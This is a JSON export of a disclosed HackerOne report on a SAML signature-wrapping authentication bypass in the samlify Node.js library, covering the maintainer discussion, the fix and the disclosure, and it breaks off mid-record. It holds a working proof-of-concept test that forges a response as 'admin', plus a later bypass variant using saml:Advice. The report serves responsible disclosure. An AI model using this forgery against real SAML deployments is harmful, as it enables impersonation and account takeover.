@@ -1,0 +1,891 @@
+{
+  "id": 356284,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTYyODQ=",
+  "url": "https://hackerone.com/reports/356284",
+  "title": "Samlify is vulnerable to signature wrapping",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-05-23T07:11:09.848Z",
+  "submitted_at": "2018-05-23T07:11:09.848Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "webtonull",
+    "url": "/webtonull",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-10-23T07:54:50.161Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-10-02T07:03:29.905Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a signature wrapping weakness in samlify\nIt allows an attacker to modify a SAML token received from the IdP before validating it with the service provider\n\n# Module\n\n**module name:** samlify\n**version:** 2.3.7\n**npm page:** `https://www.npmjs.com/package/samlify`\n\n## Module Description\n\nHighly configuarable Node.js SAML 2.0 library for Single Sign On\n\n## Module Stats\n\n> Replace stats below with numbers from npm’s module page:\n\n1084 downloads in the last week\n\n# Vulnerability\n\n## Vulnerability Description\n\nIt's possible to wrap the signature of a SAML response, and insert a new username in the original token, thus make it appear as though a different user was authenticated.\n\n## Steps To Reproduce:\n\nClone the github repo, put this in `test/flow.ts` and run `npm run test`:\n```\n\ntest('should reject signature wrapped response', async t => {\n  // sender (caution: only use metadata and public key when declare pair-up in oppoent entity)\n  const user = { email: 'user@esaml2.com' };\n  const { id, context: SAMLResponse } = await idpNoEncrypt.createLoginResponse(sp, sampleRequestInfo, 'post', user, createTemplateCallback(idpNoEncrypt, sp, user));\n  // receiver (caution: only use metadata and public key when declare pair-up in oppoent entity)\n\n  //Decode\n  var buffer = new Buffer(SAMLResponse, \"base64\");\n  var xml = buffer.toString();\n  //Create version of response without signature\n  var stripped = xml\n    .replace(/<ds:Signature[\\s\\S]*ds:Signature>/, \"\");\n  //Create version of response with altered IDs and new username\n  var outer = xml\n    .replace(/assertion\" ID=\"_[0-9a-f]{3}/g, 'assertion\" ID=\"_000')\n    .replace(\"user@esaml2.com\", \"admin@esaml2.com\");\n  //Put stripped version under SubjectConfirmationData of modified version\n  var xmlWrapped = outer.replace(/<saml:SubjectConfirmationData[^>]*\\/>/, \"<saml:SubjectConfirmationData>\" + stripped.replace('<?xml version=\"1.0\" encoding=\"UTF-8\"?>', \"\") + \"</saml:SubjectConfirmationData>\");\n  const wrappedResponse = new Buffer(xmlWrapped).toString(\"base64\");\n\n  const { samlContent, extract } = await sp.parseLoginResponse(idpNoEncrypt, 'post', { body: { SAMLResponse: wrappedResponse } });\n  //should probalby be like this -> const error = await t.throws(sp.parseLoginResponse(idpNoEncrypt, 'post', { body: { SAMLResponse: wrappedResponse } }));\n  //This tampering goes undetected....and only fails because there are now two names\n  t.is(extract.nameid, 'user@esaml2.com');\n});\r\n```\n\n## Supporting Material/References:\n\n> State all technical information about the stack where the vulnerability was found\n\n- Ubuntu 16.04\n- v7.4.0\n- 6.0.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N \n\nI will try to contact the maintainer. I did not want to open an issue as that would make it obvious what the problem was.\n\n## Impact\n\nAuthentication bypass",
+  "weakness": {
+    "id": 32,
+    "name": "Cryptographic Issues - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": "2018-11-01T07:03:29.972Z",
+  "allow_singular_disclosure_after": -154399472.7882342,
+  "singular_disclosure_allowed": true,
+  "vote_count": 7,
+  "voters": [
+    "sameerphad72",
+    "ali",
+    "eveeez",
+    "cryptographer",
+    "ramseyy",
+    "jamyboy",
+    "pofargst"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 14636,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "samlify",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 2782405,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I confirm it is reproducable, the impact has been describe and that it is in scope",
+      "automated_response": false,
+      "created_at": "2018-05-23T07:13:12.890Z",
+      "updated_at": "2018-05-23T07:14:03.781Z",
+      "actor": {
+        "username": "webtonull",
+        "cleared": false,
+        "verified": false,
+        "url": "/webtonull",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2784019,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Module owner has now been notified\n",
+      "automated_response": false,
+      "created_at": "2018-05-23T13:52:09.590Z",
+      "updated_at": "2018-05-23T13:52:09.590Z",
+      "actor": {
+        "username": "webtonull",
+        "cleared": false,
+        "verified": false,
+        "url": "/webtonull",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2789911,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @webtonull, \n\nThanks a lot for reporting the vulnerability. I will take a look at your report and triage it shortly!\n\nThanks for proactively reaching out to the maintainer. I also invited package owner to this HackerOne.\n",
+      "automated_response": false,
+      "created_at": "2018-05-24T07:14:07.863Z",
+      "updated_at": "2018-05-24T07:14:07.863Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2792795,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-05-24T16:46:33.429Z",
+      "updated_at": "2018-05-24T16:46:33.429Z",
+      "actor": {
+        "username": "tngan",
+        "cleared": false,
+        "verified": false,
+        "url": "/tngan",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2793018,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello @webtonull, @marcinhoppe \n\nThere are potentially two holes in samlify.\n\nIn SAML standard, it is required that the response to get signed, either whole message or assertion. Therefore, the side parsing response should validate the signature no matter what, so that could be a bug inside the parseResponse function that doesn't check the signature compulsorily.\n\nWe have schema checking to SAMLResponse as well, I will need some time to figure why it doesn't detect the wrapping section.\n\nAgain, thank you so much to report this.",
+      "automated_response": false,
+      "created_at": "2018-05-24T17:08:44.669Z",
+      "updated_at": "2018-05-24T17:08:44.669Z",
+      "actor": {
+        "username": "tngan",
+        "cleared": false,
+        "verified": false,
+        "url": "/tngan",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2793053,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "The schema validation didn't detect it because I intentionally put the signed response under  `<saml:SubjectConfirmationData>` which can contain anything:\nhttps://github.com/tngan/samlify/blob/master/schemas/saml-schema-assertion-2.0.xsd#L106\n\nThe wrapping goes like this:\n\n```\n<FakeResponse>\n   <SignatureOnSignedResponse>...</>\n   ...\n   <SubjectConfirmationData>\n     <SignedResponse>...</>\n  </SubjectConfirmationData>\n   ...\n</FakeResponse>\n```\n\nThe problem is that what is signed is not necessarily what is being used. The signature's reference is still pointing to an element that can be verified, but that's not necessarily the one being used. \nThe flexibility of XML signatures is also one of its weaknesses, as it becomes hard to verify it correctly.\nIf you expect the signature to sign the outer assertion, you should check that the reference in the signature points to the outer element. Basically you have to ensure that the signed element is the one that is being used.",
+      "automated_response": false,
+      "created_at": "2018-05-24T17:17:58.226Z",
+      "updated_at": "2018-05-24T17:19:20.065Z",
+      "actor": {
+        "username": "webtonull",
+        "cleared": false,
+        "verified": false,
+        "url": "/webtonull",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2803670,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "That schema assertion is downloaded from OASIS, those libraries validate the response using that schema might also expose to the wrapping vulnerability if they didn't handle the context extraction properly.\n  \nI am thinking that I should make the xpath more specific instead of searching the context of signature globally.",
+      "automated_response": false,
+      "created_at": "2018-05-27T16:51:26.772Z",
+      "updated_at": "2018-05-27T16:51:26.772Z",
+      "actor": {
+        "username": "tngan",
+        "cleared": false,
+        "verified": false,
+        "url": "/tngan",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2806475,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "This is a well known problem in the security space. See chapter 3.2 and chapter 4 in this article: https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf\nChapter 7.5 and 7.6 contain counter measures.\n",
+      "automated_response": false,
+      "created_at": "2018-05-28T17:06:02.880Z",
+      "updated_at": "2018-05-28T17:06:02.880Z",
+      "actor": {
+        "username": "webtonull",
+        "cleared": false,
+        "verified": false,
+        "url": "/webtonull",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2894024,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-06-16T13:54:26.698Z",
+      "updated_at": "2018-06-16T13:54:26.698Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2988840,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@tngan Is there a fix for this vulnerability?",
+      "automated_response": false,
+      "created_at": "2018-07-04T19:25:10.950Z",
+      "updated_at": "2018-07-04T19:25:10.950Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3060961,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I reached out to the maintainer once again over e-mail and will wait another day for a follow-up.",
+      "automated_response": false,
+      "created_at": "2018-07-18T09:39:18.461Z",
+      "updated_at": "2018-07-18T09:39:18.461Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3065268,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@tngan got back to me and he is working on the fix. My recommendation is to hold the disclosure until the fix is available.",
+      "automated_response": false,
+      "created_at": "2018-07-19T07:16:15.561Z",
+      "updated_at": "2018-07-19T07:16:15.561Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3068277,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Ok, good",
+      "automated_response": false,
+      "created_at": "2018-07-19T10:54:01.086Z",
+      "updated_at": "2018-07-19T10:54:01.086Z",
+      "actor": {
+        "username": "webtonull",
+        "cleared": false,
+        "verified": false,
+        "url": "/webtonull",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3353403,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-09-18T13:03:33.626Z",
+      "updated_at": "2018-09-18T13:03:33.626Z",
+      "additional_data": {
+        "old_severity": "High",
+        "new_severity": "High (8.0)",
+        "old_severity_id": 158192,
+        "new_severity_id": 211447
+      },
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3357607,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ChangedScope",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-09-19T09:29:14.595Z",
+      "updated_at": "2018-09-19T09:29:14.595Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "old_scope": "Other module",
+      "new_scope": "samlify",
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3395748,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@webtonull can you verify that https://github.com/tngan/samlify/releases/tag/v2.4.0-rc4 fixed this vulnerability? That would be huge help!",
+      "automated_response": false,
+      "created_at": "2018-09-27T08:17:27.167Z",
+      "updated_at": "2018-09-27T08:17:27.167Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3398774,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I believe it is still possible to bypass the validation. Try replacing line https://github.com/tngan/samlify/blob/master/test/flow.ts#L574\n`const xmlWrapped = outer.replace(/<saml:SubjectConfirmationData[^>]*\\/>/, '<saml:SubjectConfirmationData>' + stripped.replace('<?xml version=\"1.0\" encoding=\"UTF-8\"?>', '') + '</saml:SubjectConfirmationData>');`\nwith\n`const xmlWrapped = outer.replace(/<\\/saml:Conditions>/, '</saml:Conditions><saml:Advice>' + stripped.replace('<?xml version=\"1.0\" encoding=\"UTF-8\"?>', '') + '</saml:Advice>');`",
+      "automated_response": false,
+      "created_at": "2018-09-27T19:45:21.482Z",
+      "updated_at": "2018-09-27T19:45:21.482Z",
+      "actor": {
+        "username": "webtonull",
+        "cleared": false,
+        "verified": false,
+        "url": "/webtonull",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3398844,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@tngan In stead of looking for malicious elements, you should verify that the element referenced in the signature is indeed the assertion in the correct place in the xml (/Response/Assertion)",
+      "automated_response": false,
+      "created_at": "2018-09-27T19:59:35.335Z",
+      "updated_at": "2018-09-27T19:59:35.335Z",
+      "actor": {
+        "username": "webtonull",
+        "cleared": false,
+        "verified": false,
+        "url": "/webtonull",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3399603,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@webtonull I see. Is it safe to use the URI specified in the `Reference` ? What if the signature is for the entire xml, there are two types of signature declared in saml standard, one is for assertion, another one is for message, either one of them are required, or both.",
+      "automated_response": false,
+      "created_at": "2018-09-28T00:12:24.064Z",
+      "updated_at": "2018-09-28T00:12:24.064Z",
+      "actor": {
+        "username": "tngan",
+        "cleared": false,
+        "verified": false,
+        "url": "/tngan",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3399653,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I am modifying a little bit of the flow. The desired assertion node should be set after all the signatures are being verified.",
+      "automated_response": false,
+      "created_at": "2018-09-28T00:33:25.357Z",
+      "updated_at": "2018-09-28T00:33:25.357Z",
+      "actor": {
+        "username": "tngan",
+        "cleared": false,
+        "verified": false,
+        "url": "/tngan",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3399737,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "https://github.com/tngan/samlify/commit/d382bbc7c6b8ea889839ae1f178730c25b09eb42#diff-269b9d2e1bae34dc86738f5a75a21e0fR424\n\nThat's the latest commit. The assignment of that assertion node used to extract information after all the signature are verified.",
+      "automated_response": false,
+      "created_at": "2018-09-28T01:07:41.647Z",
+      "updated_at": "2018-09-28T01:07:41.647Z",
+      "actor": {
+        "username": "tngan",
+        "cleared": false,
+        "verified": false,
+        "url": "/tngan",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3403202,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@tngan Yes, this looks like a better solution. I don't see any immediate bypasses at least. Now the signed assertion/response has to be in the right position.",
+      "automated_response": false,
+      "created_at": "2018-09-28T19:19:59.741Z",
+      "updated_at": "2018-09-28T19:20:14.430Z",
+      "actor": {
+        "username": "webtonull",
+        "cleared": false,
+        "verified": false,
+        "url": "/webtonull",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3411273,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@marcinhoppe @tngan I think we can close this now",
+      "automated_response": false,
+      "created_at": "2018-10-01T05:51:39.328Z",
+      "updated_at": "2018-10-01T05:51:39.328Z",
+      "actor": {
+        "username": "webtonull",
+        "cleared": false,
+        "verified": false,
+        "url": "/webtonull",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3411432,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@webtonull Many thanks!\n\n@tngan Let me know when the package with the fix is released and I will disclose it.",
+      "automated_response": false,
+      "created_at": "2018-10-01T07:05:19.503Z",
+      "updated_at": "2018-10-01T07:05:19.503Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3417579,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@marcinhoppe Hi, can we target the end of this week ? Right now the version is still relase candidate, I want to wrap up something to release an official version instead of disclosing this issues with a rc.",
+      "automated_response": false,
+      "created_at": "2018-10-02T03:02:56.601Z",
+      "updated_at": "2018-10-02T03:02:56.601Z",
+      "actor": {
+        "username": "tngan",
+        "cleared": false,
+        "verified": false,
+        "url": "/tngan",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3417941,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@tngan Sure, just let me know when the final version of the package has been released. I will resolve this report now but will wait with the disclosure.",
+      "automated_response": false,
+      "created_at": "2018-10-02T07:02:54.969Z",
+      "updated_at": "2018-10-02T07:02:54.969Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3417942,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-10-02T07:03:07.125Z",
+      "updated_at": "2018-10-02T07:03:07.125Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "webtonull",
+        "url": "/webtonull"
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3417943,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-10-02T07:03:29.923Z",
+      "updated_at": "2018-10-02T07:03:29.923Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3501663,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@tngan Is the final package ready? The vulnerability will be disclosed in about 12 days from now but we can expedite it if the package has been released.",
+      "automated_response": false,
+      "created_at": "2018-10-19T07:26:07.039Z",
+      "updated_at": "2018-10-19T07:26:07.039Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3508259,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Yes, v2.4.0 is just released.",
+      "automated_response": false,
+      "created_at": "2018-10-20T11:43:02.191Z",
+      "updated_at": "2018-10-20T11:43:02.191Z",
+      "actor": {
+        "username": "tngan",
+        "cleared": false,
+        "verified": false,
+        "url": "/tngan",
+        "profile_picture_urls": {
